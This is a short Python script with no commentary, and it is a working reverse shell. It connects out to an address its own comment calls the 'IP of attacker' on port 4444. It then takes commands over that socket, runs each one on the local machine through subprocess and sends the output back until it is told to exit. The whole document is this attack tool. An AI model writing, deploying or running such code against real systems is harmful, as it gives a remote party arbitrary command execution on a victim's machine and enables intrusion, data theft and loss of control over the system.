import socket
import subprocess

host = '192.168.56.10'  # IP of attacker
port = 4444

s = socket.socket()
s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()

